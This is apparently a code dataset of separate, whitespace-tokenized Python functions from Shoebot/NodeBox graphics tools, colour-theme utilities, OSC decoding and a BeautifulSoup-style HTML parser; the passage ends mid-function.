def load ( self , id ) : self . clear ( ) # Root node. self . add_node ( id , root = True ) # Directly connected nodes have priority. for w , id2 in self . get_links ( id ) : self . add_edge ( id , id2 , weight = w ) if len ( self ) > self . max : break # Now get all the other nodes in the cluster. for w , id2 , links in self . get_cluster ( id ) : for id3 in links : self . add_edge ( id3 , id2 , weight = w ) self . add_edge ( id , id3 , weight = w ) #if len(links) == 0: #    self.add_edge(id, id2) if len ( self ) > self . max : break # Provide a backlink to the previous root. if self . event . clicked : g . add_node ( self . event . clicked )
def click ( self , node ) : if not self . has_node ( node . id ) : return if node == self . root : return self . _dx , self . _dy = self . offset ( node ) self . previous = self . root . id self . load ( node . id )
def angle ( x1 , y1 , x2 , y2 ) : sign = 1.0 usign = ( x1 * y2 - y1 * x2 ) if usign < 0 : sign = - 1.0 num = x1 * x2 + y1 * y2 den = hypot ( x1 , y1 ) * hypot ( x2 , y2 ) ratio = min ( max ( num / den , - 1.0 ) , 1.0 ) return sign * degrees ( acos ( ratio ) )
def transform_from_local ( xp , yp , cphi , sphi , mx , my ) : x = xp * cphi - yp * sphi + mx y = xp * sphi + yp * cphi + my return ( x , y )
def _create_view ( self , name = "shoebot-output" ) : view = Gtk . TextView ( ) view . set_editable ( False ) fontdesc = Pango . FontDescription ( "Monospace" ) view . modify_font ( fontdesc ) view . set_name ( name ) buff = view . get_buffer ( ) buff . create_tag ( 'error' , foreground = 'red' ) return view
def set_bot ( self , bot ) : self . bot = bot self . sink . set_bot ( bot )
def settings ( self , * * kwargs ) : for k , v in kwargs . items ( ) : setattr ( self , k , v )
def flush ( self , frame ) : self . sink . render ( self . size_or_default ( ) , frame , self . _drawqueue ) self . reset_drawqueue ( )
def reflect ( self , x0 , y0 , x , y ) : rx = x0 - ( x - x0 ) ry = y0 - ( y - y0 ) return rx , ry
def angle ( self , x0 , y0 , x1 , y1 ) : a = degrees ( atan ( ( y1 - y0 ) / ( x1 - x0 + 0.00001 ) ) ) + 360 if x1 - x0 < 0 : a += 180 return a
def coordinates ( self , x0 , y0 , distance , angle ) : x = x0 + cos ( radians ( angle ) ) * distance y = y0 + sin ( radians ( angle ) ) * distance return Point ( x , y )
def contains_point ( self , x , y , d = 2 ) : if self . path != None and len ( self . path ) > 1 and self . path . contains ( x , y ) : # If all points around the mouse are also part of the path, # this means we are somewhere INSIDE the path. # Only points near the edge (i.e. on the outline stroke) # should propagate. if not self . path . contains ( x + d , y ) or not self . path . contains ( x , y + d ) or not self . path . contains ( x - d , y ) or not self . path . contains ( x , y - d ) or not self . path . contains ( x + d , y + d ) or not self . path . contains ( x - d , y - d ) or not self . path . contains ( x + d , y - d ) or not self . path . contains ( x - d , y + d ) : return True return False
def draw ( self ) : # Enable interaction. self . update ( ) x , y = mouse ( ) # Snap to grid when enabled. # The grid is enabled with the TAB key. if self . show_grid : self . grid . draw ( ) x , y = self . grid . snap ( x , y ) _ctx . strokewidth ( self . strokewidth ) if self . freehand : self . draw_freehand ( ) r = 4 _ctx . nofill ( ) if len ( self . _points ) > 0 : first = True for i in range ( len ( self . _points ) ) : # Construct the path. pt = self . _points [ i ] if first : _ctx . beginpath ( pt . x , pt . y ) first = False else : if pt . cmd == CLOSE : _ctx . closepath ( ) elif pt . cmd == MOVETO : _ctx . moveto ( pt . x , pt . y ) elif pt . cmd == LINETO : _ctx . lineto ( pt . x , pt . y ) elif pt . cmd == CURVETO : _ctx . curveto ( pt . ctrl1 . x , pt . ctrl1 . y , pt . ctrl2 . x , pt . ctrl2 . y , pt . x , pt . y ) # In add- or edit-mode, # display the current point's handles. if ( ( i == self . edit and self . new == None ) or pt == self . new ) and pt . cmd == CURVETO and not pt . freehand : _ctx . stroke ( self . handle_color ) _ctx . nofill ( ) _ctx . oval ( pt . x - r , pt . y - r , r * 2 , r * 2 ) _ctx . stroke ( self . handle_color ) _ctx . line ( pt . ctrl2 . x , pt . ctrl2 . y , pt . x , pt . y ) _ctx . fill ( self . handle_color ) # Display the new point's handle being dragged. if pt == self . new and not pt . freehand : rx , ry = self . reflect ( pt . x , pt . y , pt . ctrl2 . x , pt . ctrl2 . y ) _ctx . stroke ( self . handle_color ) _ctx . line ( rx , ry , pt . x , pt . y ) _ctx . nostroke ( ) _ctx . fill ( self . handle_color ) _ctx . oval ( rx - r / 2 , ry - r / 2 , r , r ) # Display handles for point being edited. if i == self . edit and self . new == None and pt . cmd == CURVETO and not pt . freehand : _ctx . oval ( pt . ctrl2 . x - r / 2 , pt . ctrl2 . y - r / 2 , r , r ) if i > 0 : prev = self . _points [ i - 1 ] _ctx . line ( pt . ctrl1 . x , pt . ctrl1 . y , prev . x , prev . y ) _ctx . oval ( pt . ctrl1 . x - r / 2 , pt . ctrl1 . y - r / 2 , r , r ) if i > 0 and self . _points [ i - 1 ] . cmd != MOVETO : _ctx . line ( prev . ctrl2 . x , prev . ctrl2 . y , prev . x , prev . y ) if i < len ( self . _points ) - 1 : next = self . _points [ i + 1 ] if next . cmd == CURVETO : _ctx . line ( next . ctrl1 . x , next . ctrl1 . y , pt . x , pt . y ) # When hovering over a point, # highlight it. elif self . overlap ( x , y , pt . x , pt . y ) and not pt . freehand : self . insert = False # quit insert mode _ctx . nofill ( ) _ctx . stroke ( self . handle_color ) _ctx . oval ( pt . x - r , pt . y - r , r * 2 , r * 2 ) # Provide visual coordinates # for points being dragged, moved or hovered. _ctx . fontsize ( 9 ) _ctx . fill ( self . handle_color ) txt = " (" + str ( int ( pt . x ) ) + ", " + str ( int ( pt . y ) ) + ")" if ( i == self . edit and self . new == None ) or pt == self . new and not pt . freehand : _ctx . text ( txt , pt . x + r , pt . y + 2 ) elif self . overlap ( x , y , pt . x , pt . y ) and not pt . freehand : _ctx . text ( txt , pt . x + r , pt . y + 2 ) # Draw a circle for each point # in the path. if not pt . freehand : if pt . cmd != MOVETO : _ctx . fill ( self . path_color ) _ctx . nostroke ( ) else : _ctx . stroke ( self . path_color ) _ctx . nofill ( ) _ctx . oval ( pt . x - r / 2 , pt . y - r / 2 , r , r ) # Draw the current path, # update the path property. _ctx . stroke ( self . path_color ) _ctx . fill ( self . path_fill ) _ctx . autoclosepath ( False ) p = _ctx . endpath ( ) self . path = p # Possible to insert a point here. if self . insert : _ctx . stroke ( self . handle_color ) _ctx . nofill ( ) _ctx . oval ( x - r * 0.8 , y - r * 0.8 , r * 1.6 , r * 1.6 ) # When not editing a node, # prospect how the curve will continue # when adding a new point. if self . edit == None and self . new == None and self . moveto != True and not self . freehand : _ctx . nofill ( ) _ctx . stroke ( self . new_color ) rx , ry = self . reflect ( pt . x , pt . y , pt . ctrl2 . x , pt . ctrl2 . y ) _ctx . beginpath ( pt . x , pt . y ) _ctx . curveto ( rx , ry , x , y , x , y ) _ctx . endpath ( ) # A dashed line indicates what # a CLOSETO would look like. if self . last_moveto != None : start = self . last_moveto else : start = self . _points [ 0 ] p = _ctx . line ( x , y , start . x , start . y , draw = False ) try : p . _nsBezierPath . setLineDash_count_phase_ ( [ 2 , 4 ] , 2 , 50 ) except : pass _ctx . drawpath ( p ) # When doing a MOVETO, # show the new point hovering at the mouse location. elif self . edit == None and self . new == None and self . moveto != None : _ctx . stroke ( self . new_color ) _ctx . nofill ( ) _ctx . oval ( x - r * 0.8 , y - r * 0.8 , r * 1.6 , r * 1.6 ) # Draws button for a point being edited. # The first button deletes the point. # The second button, which appears only on the last point # in the path, tells the editor to perform a MOVETO # before adding a new point. if self . edit != None : pt = self . _points [ self . edit ] x = pt . x + self . btn_x y = pt . y + self . btn_y r = self . btn_r _ctx . nostroke ( ) _ctx . fill ( 0 , 0 , 0 , 0.2 ) _ctx . fill ( self . handle_color ) _ctx . oval ( x - r , y - r , r * 2 , r * 2 ) _ctx . fill ( 1 ) _ctx . rotate ( 45 ) _ctx . rect ( x - r + 2 , y - 0.625 , r + 1 , 1.25 ) _ctx . rotate ( - 90 ) _ctx . rect ( x - r + 2 , y - 0.625 , r + 1 , 1.25 ) _ctx . reset ( ) if self . edit == len ( self . _points ) - 1 : _ctx . fill ( self . handle_color ) _ctx . oval ( x + r * 2 + 2 - r , y - r , r * 2 , r * 2 ) _ctx . fill ( 1 ) _ctx . rect ( x + r * 2 + 2 - 2.25 , y - r + 3 , 1.5 , r - 1 ) _ctx . rect ( x + r * 2 + 2 + 0.75 , y - r + 3 , 1.5 , r - 1 ) # Handle onscreen notifications. # Any text in msg is displayed in a box in the center # and slowly fades away, after which msg is cleared.     if self . msg != "" : self . msg_alpha -= 0.1 _ctx . nostroke ( ) _ctx . fill ( 0 , 0 , 0 , self . msg_alpha ) _ctx . fontsize ( 18 ) _ctx . lineheight ( 1 ) w = _ctx . textwidth ( self . msg ) _ctx . rect ( _ctx . WIDTH / 2 - w / 2 - 9 , _ctx . HEIGHT / 2 - 27 , w + 18 , 36 , roundness = 0.4 ) _ctx . fill ( 1 , 1 , 1 , 0.8 ) _ctx . align ( CENTER ) _ctx . text ( self . msg , 0 , _ctx . HEIGHT / 2 , width = _ctx . WIDTH ) if self . msg_alpha <= 0.0 : self . msg = "" self . msg_alpha = 1.0
def gtk_mouse_button_down ( self , widget , event ) : if self . menu_enabled and event . button == 3 : menu = self . uimanager . get_widget ( '/Save as' ) menu . popup ( None , None , None , None , event . button , event . time ) else : super ( ShoebotWindow , self ) . gtk_mouse_button_down ( widget , event )
def show_variables_window ( self ) : if self . var_window is None and self . bot . _vars : self . var_window = VarWindow ( self , self . bot , '%s variables' % ( self . title or 'Shoebot' ) ) self . var_window . window . connect ( "destroy" , self . var_window_closed )
def hide_variables_window ( self ) : if self . var_window is not None : self . var_window . window . destroy ( ) self . var_window = None
def do_fullscreen ( self , widget ) : self . fullscreen ( ) self . is_fullscreen = True # next lines seem to be needed for window switching really to # fullscreen mode before reading it's size values while Gtk . events_pending ( ) : Gtk . main_iteration ( ) # we pass informations on full-screen size to bot self . bot . _screen_width = Gdk . Screen . width ( ) self . bot . _screen_height = Gdk . Screen . height ( ) self . bot . _screen_ratio = self . bot . _screen_width / self . bot . _screen_height
def do_unfullscreen ( self , widget ) : self . unfullscreen ( ) self . is_fullscreen = False self . bot . _screen_ratio = None
def do_window_close ( self , widget , data = None ) : publish_event ( QUIT_EVENT ) if self . has_server : self . sock . close ( ) self . hide_variables_window ( ) self . destroy ( ) self . window_open = False
def do_toggle_fullscreen ( self , action ) : is_fullscreen = action . get_active ( ) if is_fullscreen : self . fullscreen ( ) else : self . unfullscreen ( )
def do_toggle_variables ( self , action ) : self . show_vars = action . get_active ( ) if self . show_vars : self . show_variables_window ( ) else : self . hide_variables_window ( )
def _mouse_pointer_moved ( self , x , y ) : self . _namespace [ 'MOUSEX' ] = x self . _namespace [ 'MOUSEY' ] = y
def _key_pressed ( self , key , keycode ) : self . _namespace [ 'key' ] = key self . _namespace [ 'keycode' ] = keycode self . _namespace [ 'keydown' ] = True
def set_callbacks ( self , * * kwargs ) : for name in self . SUPPORTED_CALLBACKS : func = kwargs . get ( name , getattr ( self , name ) ) setattr ( self , name , func )
def complement ( clr ) : clr = color ( clr ) colors = colorlist ( clr ) colors . append ( clr . complement ) return colors
def right_complement ( clr ) : right = split_complementary ( clr ) [ 2 ] colors = complementary ( clr ) colors [ 3 ] . h = right . h colors [ 4 ] . h = right . h colors [ 5 ] . h = right . h colors = colorlist ( colors [ 0 ] , colors [ 2 ] , colors [ 1 ] , colors [ 5 ] , colors [ 4 ] , colors [ 3 ] ) return colors
def compound ( clr , flip = False ) : def _wrap ( x , min , threshold , plus ) : if x - min < threshold : return x + plus else : return x - min d = 1 if flip : d = - 1 clr = color ( clr ) colors = colorlist ( clr ) c = clr . rotate_ryb ( 30 * d ) c . brightness = _wrap ( clr . brightness , 0.25 , 0.6 , 0.25 ) colors . append ( c ) c = clr . rotate_ryb ( 30 * d ) c . saturation = _wrap ( clr . saturation , 0.4 , 0.1 , 0.4 ) c . brightness = _wrap ( clr . brightness , 0.4 , 0.2 , 0.4 ) colors . append ( c ) c = clr . rotate_ryb ( 160 * d ) c . saturation = _wrap ( clr . saturation , 0.25 , 0.1 , 0.25 ) c . brightness = max ( 0.2 , clr . brightness ) colors . append ( c ) c = clr . rotate_ryb ( 150 * d ) c . saturation = _wrap ( clr . saturation , 0.1 , 0.8 , 0.1 ) c . brightness = _wrap ( clr . brightness , 0.3 , 0.6 , 0.3 ) colors . append ( c ) c = clr . rotate_ryb ( 150 * d ) c . saturation = _wrap ( clr . saturation , 0.1 , 0.8 , 0.1 ) c . brightness = _wrap ( clr . brightness , 0.4 , 0.2 , 0.4 ) # colors.append(c) return colors
def blend ( self , clr , factor = 0.5 ) : r = self . r * ( 1 - factor ) + clr . r * factor g = self . g * ( 1 - factor ) + clr . g * factor b = self . b * ( 1 - factor ) + clr . b * factor a = self . a * ( 1 - factor ) + clr . a * factor return Color ( r , g , b , a , mode = "rgb" )
def swatch ( self , x , y , w = 35 , h = 35 , roundness = 0 ) : _ctx . fill ( self ) _ctx . rect ( x , y , w , h , roundness )
def copy ( self ) : return ColorList ( [ color ( clr . r , clr . g , clr . b , clr . a , mode = "rgb" ) for clr in self ] , name = self . name , tags = self . tags )
def _average ( self ) : r , g , b , a = 0 , 0 , 0 , 0 for clr in self : r += clr . r g += clr . g b += clr . b a += clr . alpha r /= len ( self ) g /= len ( self ) b /= len ( self ) a /= len ( self ) return color ( r , g , b , a , mode = "rgb" )
def _sorted_copy ( self , comparison , reversed = False ) : sorted = self . copy ( ) _list . sort ( sorted , comparison ) if reversed : _list . reverse ( sorted ) return sorted
def reverse ( self ) : colors = ColorList . copy ( self ) _list . reverse ( colors ) return colors
def swatch ( self , x , y , w = 35 , h = 35 , padding = 0 , roundness = 0 ) : for clr in self : clr . swatch ( x , y , w , h , roundness ) y += h + padding
def swarm ( self , x , y , r = 100 ) : sc = _ctx . stroke ( 0 , 0 , 0 , 0 ) sw = _ctx . strokewidth ( 0 ) _ctx . push ( ) _ctx . transform ( _ctx . CORNER ) _ctx . translate ( x , y ) for i in _range ( r * 3 ) : clr = choice ( self ) . copy ( ) clr . alpha -= 0.5 * random ( ) _ctx . fill ( clr ) clr = choice ( self ) _ctx . stroke ( clr ) _ctx . strokewidth ( 10 * random ( ) ) _ctx . rotate ( 360 * random ( ) ) r2 = r * 0.5 * random ( ) _ctx . oval ( r * random ( ) , 0 , r2 , r2 ) _ctx . pop ( ) _ctx . strokewidth ( sw ) if sc is None : _ctx . nostroke ( ) else : _ctx . stroke ( sc )
def _interpolate ( self , colors , n = 100 ) : gradient = [ ] for i in _range ( n ) : l = len ( colors ) - 1 x = int ( 1.0 * i / n * l ) x = min ( x + 0 , l ) y = min ( x + 1 , l ) base = 1.0 * n / l * x d = ( i - base ) / ( 1.0 * n / l ) r = colors [ x ] . r * ( 1 - d ) + colors [ y ] . r * d g = colors [ x ] . g * ( 1 - d ) + colors [ y ] . g * d b = colors [ x ] . b * ( 1 - d ) + colors [ y ] . b * d a = colors [ x ] . a * ( 1 - d ) + colors [ y ] . a * d gradient . append ( color ( r , g , b , a , mode = "rgb" ) ) gradient . append ( colors [ - 1 ] ) return gradient
def _save ( self ) : if not os . path . exists ( self . cache ) : os . makedirs ( self . cache ) path = os . path . join ( self . cache , self . name + ".xml" ) f = open ( path , "w" ) f . write ( self . xml ) f . close ( )
def colors ( self , n = 10 , d = 0.035 ) : s = sum ( [ w for clr , rng , w in self . ranges ] ) colors = colorlist ( ) for i in _range ( n ) : r = random ( ) for clr , rng , weight in self . ranges : if weight / s >= r : break r -= weight / s colors . append ( rng ( clr , d ) ) return colors
def recombine ( self , other , d = 0.7 ) : a , b = self , other d1 = max ( 0 , min ( d , 1 ) ) d2 = d1 c = ColorTheme ( name = a . name [ : int ( len ( a . name ) * d1 ) ] + b . name [ int ( len ( b . name ) * d2 ) : ] , ranges = a . ranges [ : int ( len ( a . ranges ) * d1 ) ] + b . ranges [ int ( len ( b . ranges ) * d2 ) : ] , top = a . top , cache = os . path . join ( DEFAULT_CACHE , "recombined" ) , blue = a . blue , length = a . length * d1 + b . length * d2 ) c . tags = a . tags [ : int ( len ( a . tags ) * d1 ) ] c . tags += b . tags [ int ( len ( b . tags ) * d2 ) : ] return c
def _render_closure ( self ) : fillcolor = self . fill strokecolor = self . stroke strokewidth = self . strokewidth def _render ( cairo_ctx ) : # Go to initial point (CORNER or CENTER): transform = self . _call_transform_mode ( self . _transform ) if fillcolor is None and strokecolor is None : # Fixes _bug_FillStrokeNofillNostroke.bot return cairo_ctx . set_matrix ( transform ) # Run the path commands on the cairo context: self . _traverse ( cairo_ctx ) # Matrix affects stroke, so we need to reset it: cairo_ctx . set_matrix ( cairo . Matrix ( ) ) if fillcolor is not None and strokecolor is not None : if strokecolor [ 3 ] < 1 : # Draw onto intermediate surface so that stroke # does not overlay fill cairo_ctx . push_group ( ) cairo_ctx . set_source_rgba ( * fillcolor ) cairo_ctx . fill_preserve ( ) e = cairo_ctx . stroke_extents ( ) cairo_ctx . set_source_rgba ( * strokecolor ) cairo_ctx . set_operator ( cairo . OPERATOR_SOURCE ) cairo_ctx . set_line_width ( strokewidth ) cairo_ctx . stroke ( ) cairo_ctx . pop_group_to_source ( ) cairo_ctx . paint ( ) else : # Fast path if no alpha in stroke cairo_ctx . set_source_rgba ( * fillcolor ) cairo_ctx . fill_preserve ( ) cairo_ctx . set_source_rgba ( * strokecolor ) cairo_ctx . set_line_width ( strokewidth ) cairo_ctx . stroke ( ) elif fillcolor is not None : cairo_ctx . set_source_rgba ( * fillcolor ) cairo_ctx . fill ( ) elif strokecolor is not None : cairo_ctx . set_source_rgba ( * strokecolor ) cairo_ctx . set_line_width ( strokewidth ) cairo_ctx . stroke ( ) return _render
def _linelength ( self , x0 , y0 , x1 , y1 ) : # Originally from nodebox-gl a = pow ( abs ( x0 - x1 ) , 2 ) b = pow ( abs ( y0 - y1 ) , 2 ) return sqrt ( a + b )
def _segment_lengths ( self , relative = False , n = 20 ) : # From nodebox_gl lengths = [ ] first = True for el in self . _get_elements ( ) : if first is True : close_x , close_y = el . x , el . y first = False elif el . cmd == MOVETO : close_x , close_y = el . x , el . y lengths . append ( 0.0 ) elif el . cmd == CLOSE : lengths . append ( self . _linelength ( x0 , y0 , close_x , close_y ) ) elif el . cmd == LINETO : lengths . append ( self . _linelength ( x0 , y0 , el . x , el . y ) ) elif el . cmd == CURVETO : x3 , y3 , x1 , y1 , x2 , y2 = el . x , el . y , el . c1x , el . c1y , el . c2x , el . c2y # (el.c1x, el.c1y, el.c2x, el.c2y, el.x, el.y) lengths . append ( self . _curvelength ( x0 , y0 , x1 , y1 , x2 , y2 , x3 , y3 , n ) ) if el . cmd != CLOSE : x0 = el . x y0 = el . y if relative : length = sum ( lengths ) try : # Relative segment lengths' sum is 1.0. return map ( lambda l : l / length , lengths ) except ZeroDivisionError : # If the length is zero, just return zero for all segments return [ 0.0 ] * len ( lengths ) else : return lengths
def _get_elements ( self ) : for index , el in enumerate ( self . _elements ) : if isinstance ( el , tuple ) : el = PathElement ( * el ) self . _elements [ index ] = el yield el
def _description ( self ) : meta = self . find ( "meta" , { "name" : "description" } ) if isinstance ( meta , dict ) and meta . has_key ( "content" ) : return meta [ "content" ] else : return u""
def _keywords ( self ) : meta = self . find ( "meta" , { "name" : "keywords" } ) if isinstance ( meta , dict ) and meta . has_key ( "content" ) : keywords = [ k . strip ( ) for k in meta [ "content" ] . split ( "," ) ] else : keywords = [ ] return keywords
def sorted ( list , cmp = None , reversed = False ) : list = [ x for x in list ] list . sort ( cmp ) if reversed : list . reverse ( ) return list
def unique ( list ) : unique = [ ] [ unique . append ( x ) for x in list if x not in unique ] return unique
def clique ( graph , id ) : clique = [ id ] for n in graph . nodes : friend = True for id in clique : if n . id == id or graph . edge ( n . id , id ) == None : friend = False break if friend : clique . append ( n . id ) return clique
def cliques ( graph , threshold = 3 ) : cliques = [ ] for n in graph . nodes : c = clique ( graph , n . id ) if len ( c ) >= threshold : c . sort ( ) if c not in cliques : cliques . append ( c ) return cliques
def hexDump ( bytes ) : for i in range ( len ( bytes ) ) : sys . stdout . write ( "%2x " % ( ord ( bytes [ i ] ) ) ) if ( i + 1 ) % 8 == 0 : print repr ( bytes [ i - 7 : i + 1 ] ) if ( len ( bytes ) % 8 != 0 ) : print string . rjust ( "" , 11 ) , repr ( bytes [ i - len ( bytes ) % 8 : i + 1 ] )
def decodeOSC ( data ) : table = { "i" : readInt , "f" : readFloat , "s" : readString , "b" : readBlob } decoded = [ ] address , rest = readString ( data ) typetags = "" if address == "#bundle" : time , rest = readLong ( rest ) #       decoded.append(address) #       decoded.append(time) while len ( rest ) > 0 : length , rest = readInt ( rest ) decoded . append ( decodeOSC ( rest [ : length ] ) ) rest = rest [ length : ] elif len ( rest ) > 0 : typetags , rest = readString ( rest ) decoded . append ( address ) decoded . append ( typetags ) if typetags [ 0 ] == "," : for tag in typetags [ 1 : ] : value , rest = table [ tag ] ( rest ) decoded . append ( value ) else : print "Oops, typetag lacks the magic ," return decoded
def dispatch ( self , message , source = None ) : msgtype = "" try : if type ( message [ 0 ] ) == str : # got a single message address = message [ 0 ] self . callbacks [ address ] ( message ) elif type ( message [ 0 ] ) == list : for msg in message : self . dispatch ( msg ) except KeyError , key : print 'address %s not found, %s: %s' % ( address , key , message ) pprint . pprint ( message ) except IndexError , e : print '%s: %s' % ( e , message ) pass except None , e : print "Exception in" , address , "callback :" , e return
def find_example_dir ( ) : # Replace %s with directory to check for shoebot menus. code_stub = textwrap . dedent ( ) # Needs to run in same python env as shoebot (may be different to gedits) code = code_stub % 'share/shoebot/examples' cmd = [ "python" , "-c" , code ] p = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) output , errors = p . communicate ( ) if errors : print ( 'Shoebot experienced errors searching for install and examples.' ) print ( 'Errors:\n{0}' . format ( errors . decode ( 'utf-8' ) ) ) return None else : examples_dir = output . decode ( 'utf-8' ) . strip ( ) if os . path . isdir ( examples_dir ) : return examples_dir # If user is running 'setup.py develop' then examples could be right here #code = "from pkg_resources import resource_filename, Requirement; print resource_filename(Requirement.parse('shoebot'), 'examples/')" code = code_stub % 'examples/' cmd = [ "python" , "-c" , code ] p = subprocess . Popen ( cmd , stdout = subprocess . PIPE ) output , errors = p . communicate ( ) examples_dir = output . decode ( 'utf-8' ) . strip ( ) if os . path . isdir ( examples_dir ) : return examples_dir if examples_dir : print ( 'Shoebot could not find examples at: {0}' . format ( examples_dir ) ) else : print ( 'Shoebot could not find install dir and examples.' )
def eof ( self ) : return ( not self . is_alive ( ) ) and self . _queue . empty ( ) or self . _fd . closed
def close ( self ) : self . process . stdout . close ( ) self . process . stderr . close ( ) self . running = False
def get_command_responses ( self ) : if not self . response_queue . empty ( ) : yield None while not self . response_queue . empty ( ) : line = self . response_queue . get ( ) if line is not None : yield line
def _get_center ( self ) : w , h = self . layout . get_pixel_size ( ) x = ( self . x + w / 2 ) y = ( self . y + h / 2 ) return x , y
def draw_math ( str , x , y , alpha = 1.0 ) : try : from web import _ctx except : pass str = re . sub ( "</{0,1}math>" , "" , str . strip ( ) ) img = mimetex . gif ( str ) w , h = _ctx . imagesize ( img ) _ctx . image ( img , x , y , alpha = alpha ) return w , h
def draw_table ( table , x , y , w , padding = 5 ) : try : from web import _ctx except : pass f = _ctx . fill ( ) _ctx . stroke ( f ) h = _ctx . textheight ( " " ) + padding * 2 row_y = y if table . title != "" : _ctx . fill ( f ) _ctx . rect ( x , row_y , w , h ) _ctx . fill ( 1 ) _ctx . text ( table . title , x + padding , row_y + _ctx . fontsize ( ) + padding ) row_y += h # A table of flags marking how long a cell  # from a previous row is still spanning in a column. rowspans = [ 1 for i in range ( 10 ) ] previous_cell_w = 0 for row in table : cell_x = x # The width of a cell is the total table width  # evenly divided by the number of cells. # Previous rows' cells still spanning will push cells # to the right and decrease their width. cell_w = 1.0 * w cell_w -= previous_cell_w * len ( [ n for n in rowspans if n > 1 ] ) cell_w /= len ( row ) # The height of each cell is the highest cell in the row. # The height depends on the amount of text in the cell. cell_h = 0 for cell in row : this_h = _ctx . textheight ( cell , width = cell_w - padding * 2 ) + padding * 2 cell_h = max ( cell_h , this_h ) # Traverse each cell in this row. i = 0 for cell in row : # If a previous row's cell is still spanning, # push this cell to the right. if rowspans [ i ] > 1 : rowspans [ i ] -= 1 cell_x += previous_cell_w i += 1 # Get the rowspan attribute for this cell. m = re . search ( "rowspan=\"(.*?)\"" , cell . properties ) if m : rowspan = int ( m . group ( 1 ) ) rowspans [ i ] = rowspan else : rowspan = 1 # Padded cell text.             # Horizontal line above each cell. # Vertical line before each cell. _ctx . fill ( f ) _ctx . text ( cell , cell_x + padding , row_y + _ctx . fontsize ( ) + padding , cell_w - padding * 2 ) _ctx . line ( cell_x , row_y , cell_x + cell_w , row_y ) if cell_x > x : _ctx . nofill ( ) _ctx . line ( cell_x , row_y , cell_x , row_y + cell_h ) cell_x += cell_w i += 1 # Move to next row. row_y += cell_h previous_cell_w = cell_w # Table's bounding rectangle. _ctx . nofill ( ) _ctx . rect ( x , y , w , row_y - y )
def sanitize ( self , val ) : if self . type == NUMBER : try : return clamp ( self . min , self . max , float ( val ) ) except ValueError : return 0.0 elif self . type == TEXT : try : return unicode ( str ( val ) , "utf_8" , "replace" ) except : return "" elif self . type == BOOLEAN : if unicode ( val ) . lower ( ) in ( "true" , "1" , "yes" ) : return True else : return False
def extract ( self ) : if self . parent : try : self . parent . contents . remove ( self ) except ValueError : pass #Find the two elements that would be next to each other if #this element (and any children) hadn't been parsed. Connect #the two. lastChild = self . _lastRecursiveChild ( ) nextElement = lastChild . next if self . previous : self . previous . next = nextElement if nextElement : nextElement . previous = self . previous self . previous = None lastChild . next = None self . parent = None if self . previousSibling : self . previousSibling . nextSibling = self . nextSibling if self . nextSibling : self . nextSibling . previousSibling = self . previousSibling self . previousSibling = self . nextSibling = None return self
def _lastRecursiveChild ( self ) : lastChild = self while hasattr ( lastChild , 'contents' ) and lastChild . contents : lastChild = lastChild . contents [ - 1 ] return lastChild
def _findAll ( self , name , attrs , text , limit , generator , * * kwargs ) : if isinstance ( name , SoupStrainer ) : strainer = name else : # Build a SoupStrainer strainer = SoupStrainer ( name , attrs , text , * * kwargs ) results = ResultSet ( strainer ) g = generator ( ) while True : try : i = g . next ( ) except StopIteration : break if i : found = strainer . search ( i ) if found : results . append ( found ) if limit and len ( results ) >= limit : break return results
def _invert ( h ) : i = { } for k , v in h . items ( ) : i [ v ] = k return i
def decompose ( self ) : contents = [ i for i in self . contents ] for i in contents : if isinstance ( i , Tag ) : i . decompose ( ) else : i . extract ( ) self . extract ( )
def convert_charref ( self , name ) : try : n = int ( name ) except ValueError : return if not 0 <= n <= 127 : # ASCII ends at 127, not 255 return return self . convert_codepoint ( n )
def handle_charref ( self , ref ) : if self . convertEntities : data = unichr ( int ( ref ) ) else : data = '&#%s;' % ref self . handle_data ( data )
def _detectEncoding ( self , xml_data , isHTML = False ) : xml_encoding = sniffed_xml_encoding = None try : if xml_data [ : 4 ] == '\x4c\x6f\xa7\x94' : # EBCDIC xml_data = self . _ebcdic_to_ascii ( xml_data ) elif xml_data [ : 4 ] == '\x00\x3c\x00\x3f' : # UTF-16BE sniffed_xml_encoding = 'utf-16be' xml_data = unicode ( xml_data , 'utf-16be' ) . encode ( 'utf-8' ) elif ( len ( xml_data ) >= 4 ) and ( xml_data [ : 2 ] == '\xfe\xff' ) and ( xml_data [ 2 : 4 ] != '\x00\x00' ) : # UTF-16BE with BOM sniffed_xml_encoding = 'utf-16be' xml_data = unicode ( xml_data [ 2 : ] , 'utf-16be' ) . encode ( 'utf-8' ) elif xml_data [ : 4 ] == '\x3c\x00\x3f\x00' : # UTF-16LE sniffed_xml_encoding = 'utf-16le' xml_data = unicode ( xml_data , 'utf-16le' ) . encode ( 'utf-8' ) elif ( len ( xml_data ) >= 4 ) and ( xml_data [ : 2 ] == '\xff\xfe' ) and ( xml_data [ 2 : 4 ] != '\x00\x00' ) : # UTF-16LE with BOM sniffed_xml_encoding = 'utf-16le' xml_data = unicode ( xml_data [ 2 : ] , 'utf-16le' ) . encode ( 'utf-8' ) elif xml_data [ : 4 ] == '\x00\x00\x00\x3c' : # UTF-32BE sniffed_xml_encoding = 'utf-32be' xml_data = unicode ( xml_data , 'utf-32be' ) . encode ( 'utf-8' ) elif xml_data [ : 4 ] == '\x3c\x00\x00\x00' : # UTF-32LE sniffed_xml_encoding = 'utf-32le' xml_data = unicode ( xml_data , 'utf-32le' ) . encode ( 'utf-8' ) elif xml_data [ : 4 ] == '\x00\x00\xfe\xff' : # UTF-32BE with BOM sniffed_xml_encoding = 'utf-32be' xml_data = unicode ( xml_data [ 4 : ] , 'utf-32be' ) . encode ( 'utf-8' ) elif xml_data [ : 4 ] == '\xff\xfe\x00\x00' : # UTF-32LE with BOM sniffed_xml_encoding = 'utf-32le' xml_data = unicode ( xml_data [ 4 : ] , 'utf-32le' ) . encode ( 'utf-8' ) elif xml_data [ : 3 ] == '\xef\xbb\xbf' : # UTF-8 with BOM sniffed_xml_encoding = 'utf-8' xml_data = unicode ( xml_data [ 3 : ] , 'utf-8' ) . encode ( 'utf-8' ) else : sniffed_xml_encoding = 'ascii' pass except : xml_encoding_match = None xml_encoding_match = re . compile ( '^<\?.*encoding=[\'"](.*?)[\'"].*\?>' ) . match ( xml_data ) if not xml_encoding_match and isHTML : regexp = re . compile ( '<\s*meta[^>]+charset=([^>]*?)[;\'">]' , re . I ) xml_encoding_match = regexp . search ( xml_data ) if xml_encoding_match is not None : xml_encoding = xml_encoding_match . groups ( ) [ 0 ] . lower ( ) if isHTML : self . declaredHTMLEncoding = xml_encoding if sniffed_xml_encoding and ( xml_encoding in ( 'iso-10646-ucs-2' , 'ucs-2' , 'csunicode' , 